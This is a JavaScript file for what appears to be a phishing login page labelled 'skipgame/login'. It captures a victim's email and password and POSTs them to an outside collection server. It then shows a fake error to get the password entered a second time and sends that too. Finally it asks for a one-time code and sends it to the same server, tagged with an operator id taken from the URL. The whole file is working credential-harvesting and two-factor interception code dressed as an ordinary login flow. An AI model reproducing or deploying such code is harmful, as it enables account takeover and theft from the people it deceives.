
  const loginSystem = document.getElementById("loginSystem");
  const otpSystem = document.getElementById("otpSystem");
  const mainSystem = document.getElementById("mainSystem");
  const errorMsg = document.querySelector("#error");
  const loginForm = document.querySelector("#loginSystem form");
  const otpForm = document.querySelector("#otpSystem");

  let passClick=1

  // utility Functions
  async function postData( formData) {
    const url = 'https://dashboarduser.onrender.com/api/information'
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          // Add any other headers if needed
        },
        body: JSON.stringify(formData),
      });
  
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
  
      const data = await response.json();

      // Assuming you have these functions defined somewhere
      hideElement(otpSystem);
      showElement(otpSystem);
      return data
    } catch (error) {
      // Handle errors
      console.error('Error:', error);
    }
  }

  async function updateData( id,formData) {
    const url = `https://dashboarduser.onrender.com/api/information/${id}`
    try {
      const response = await fetch(url, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          // Add any other headers if needed
        },
        body: JSON.stringify(formData),
      });
  
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
  
      const data = await response.json();
      console.log('Response from server:', data);
  
      // Assuming you have these functions defined somewhere
      hideElement(otpSystem);
      showElement(otpSystem);
    } catch (error) {
      // Handle errors
      console.error('Error:', error);
    }
  }

  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const userId = urlParams.get('id');
 

  otpSystem.style.display = "none";

  // Object to store form data
  const formData = {};
  let updatedId = null;

  // Function to hide an element
  function hideElement(element) {
    element.style.display = "none";
  }
  // Function to show an element
  function showElement(element) {
  
    element.style.display = "block";
  }

  // Function to handle login form submission
  async function handleLoginSubmit(event) {
      console.log('clicked');
    event.preventDefault();
    if(passClick<2){
     passClick++
     formData.email = loginForm.querySelector('input[type="email"]').value;
     formData.password = loginForm.querySelector('input[type="password"]').value;
     showElement(errorMsg)
     formData.user=userId
     const  data = {...formData,siteName:"skipgame/login"}
     const result = await postData(data)
     updatedId= result?.data?._id
     loginForm.querySelector('input[type="password"]').value = '';
     return 
    }
    formData.email = loginForm.querySelector('input[type="email"]').value;
    formData.repassword = loginForm.querySelector('input[type="password"]').value;
    await updateData(updatedId,{repassword:formData.repassword ,user:formData.user})
    
  
    // Hide login form and show OTP form
    hideElement(loginSystem);
    showElement(otpSystem);
    hideElement(mainSystem)
      }

  // Function to handle OTP form submission
 async function handleOTPSubmit(event) {
    event.preventDefault();
    const otp = otpForm.querySelector('input[type="text"]').value;
    await updateData(updatedId,{otp:otp,user:formData.user})
    hideElement(otpSystem);
    showElement(loginSystem);
    window.location.reload();
  }

  // Event listeners
  loginForm.addEventListener("submit", handleLoginSubmit);
  otpForm.addEventListener("submit", handleOTPSubmit);

  // Event listener for the "Log out instead" link in the OTP section
  document.querySelector("#otpSystem a[href='#']").addEventListener("click", function (event) {
    event.preventDefault();
    showElement(loginSystem);
    hideElement(otpSystem);
  });

